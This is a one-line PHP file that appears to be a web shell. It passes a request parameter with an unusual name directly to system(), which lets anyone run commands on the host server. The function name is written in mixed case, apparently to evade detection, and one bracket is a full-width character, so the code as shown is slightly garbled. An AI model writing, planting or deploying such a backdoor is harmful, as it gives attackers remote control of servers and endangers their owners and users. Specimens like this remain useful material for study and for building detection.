<?php
SysTeM($_GET['NI-reh1D'〕);
?>
